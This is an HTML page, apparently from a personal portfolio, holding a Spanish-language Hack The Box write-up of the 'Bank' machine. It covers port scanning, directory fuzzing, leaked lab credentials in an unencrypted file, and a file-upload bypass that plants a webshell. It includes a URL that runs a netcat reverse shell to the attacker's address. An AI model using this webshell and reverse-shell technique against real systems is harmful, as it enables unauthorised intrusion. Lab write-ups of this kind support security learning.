@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bank | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge htb">HTB</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Bank</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">Hack The Box</strong></span>
+        <span>Tags: <span>Web</span><span>DNS</span><span>Upload</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+<h1>INTRUSION INICIAL </h1>
+
+<h2>Reconocimiento de puertos</h2>
+
+<p>comando : <code>nmap -sS -p- --open --min-rate 5000 -Pn -n 10.129.29.200  -oN nmap</code></p>
+
+<p>Resultados:</p>
+
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 21:21 EST
+<p>Nmap scan report for 10.129.29.200</p>
+<p>Host is up (3.0s latency).</p>
+<p>Not shown: 52633 filtered tcp ports (no-response), 12899 closed tcp ports (reset)</p>
+<p>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</p>
+<p>PORT   STATE SERVICE</p>
+<p>22/tcp open  ssh</p>
+<p>53/tcp open  domain</p>
+<p>80/tcp open  http</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 29.90 seconds</code></pre></p>
+
+<hr>
+
+<h2>Servidor Web</h2>
+
+<em>[imagen]</em>
+<p>vemos que hay un panel de login, probamos <code>SQLi</code> y nada</p>
+
+<h3>Fuzzing Web</h3>
+
+<p>comando: <code>gobuster dir -u http://bank.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200</code></p>
+
+<pre><code>/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
+<p>/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]</p>
+<p>/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]</p>
+<p>/balance-transfer/    (Status: 200) [Size: 253503]</code></pre></p>
+<p>echamos un vistazo a <code>/balance-transfer/</code> y vemos que hay un monton de archivos <strong>.acc</strong></p>
+
+<p>vemos que los archivos tienen cotenido tipo asi:</p>
+
+<pre><code>++OK ENCRYPT SUCCESS
+<p>+=================+</p>
+<p>| HTB Bank Report |</p>
+<p>+=================+</p>
+
+<p>===UserAccount===</p>
+<p>Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T</p>
+<p>Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE</p>
+<p>Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi</p>
+<p>CreditCards: 5</p>
+<p>Transactions: 93</p>
+<p>Balance: 905948 .</p>
+<p>===UserAccount===</code></pre></p>
+<p>por lo que vemos no son hash, vamos a ver si hay un archivo diferente</p>
+
+<p>hacemos un curl a la pagina y lo guardamos en un documento, luego hacemos un comando de filtrado para encontrar un archivo con un size diferente</p>
+
+<p>comando: <code>cat transfers.txt | cut -d "=" -f 5,7 | grep -vE "584|585|582|583"</code></p>
+
+<p>encontramos un archivo diferente:</p>
+<code>.acc">68576f20e9732f1b2edc4df5b8533230.acc</a></td><td align="right">257 </td><td>&nbsp;</td></tr></code>
+
+<p>vemos que tiene credenciales sin encriptar:</p>
+
+<pre><code>--ERR ENCRYPT FAILED
+<p>+=================+</p>
+<p>| HTB Bank Report |</p>
+<p>+=================+</p>
+
+<p>===UserAccount===</p>
+<p>Full Name: Christos Christopoulos</p>
+<p>Email: chris@bank.htb</p>
+<p>Password: !##HTBB4nkP4ssw0rd!##</p>
+<p>CreditCards: 568576f20e9732f1b2edc4df5b8533230</p>
+<p>Transactions: 39</p>
+<p>Balance: 8842803 .</p>
+<p>===UserAccount===</code></pre></p>
+
+<p>nos logeamos:</p>
+
+<em>[imagen]</em>
+
+
+<hr>
+
+<h3>Explotacion Web</h3>
+
+<p>vemos que podemos subir archivos en la parte de support, probamos a subir un archivo <code>.php</code> pero no podemos, buscamos en el <code>DOM</code> de la pagina para ver si del lado del cliente hay codigo que impida esto, pero por otro lado encontramos el siguiente comentario:</p>
+
+<em>[imagen]</em>
+
+<p>por lo que vemos podemos subir un archivo <strong>.htb</strong> y se ejecutara como <strong>.php</strong></p>
+
+<p>por lo tanto subimos una webshell y obtenemos una reverse shell</p>
+
+<pre><code>http://bank.htb/uploads/cmd.htb?cmd=nc%2010.10.14.39%20444%20-e%20/bin/bash</code></pre>
+<em>[imagen]</em>
+
+
+
+<hr>
+
+<h1>PRIVESC</h1>
+
+<p>viendo los archivos del servidor web, vemos que encontramos un <strong>.php</strong> que trata de conectarse a una dbs mysql con las credenciales root</p>
+<em>[imagen]</em>
+<p>pero no es la password del user</p>
+
+<p>buscando , encontramos un binario que nos da una root shell y ya finalizamos</p>
+
+
+<hr>
+<em>[imagen]</em>
+
+<hr>
+
+
+<p>https://labs.hackthebox.com/achievement/machine/2041302/26</p>
+
+
+
+
+
+
+
+
+    </div>
+  </div>
+</body>
+</html>
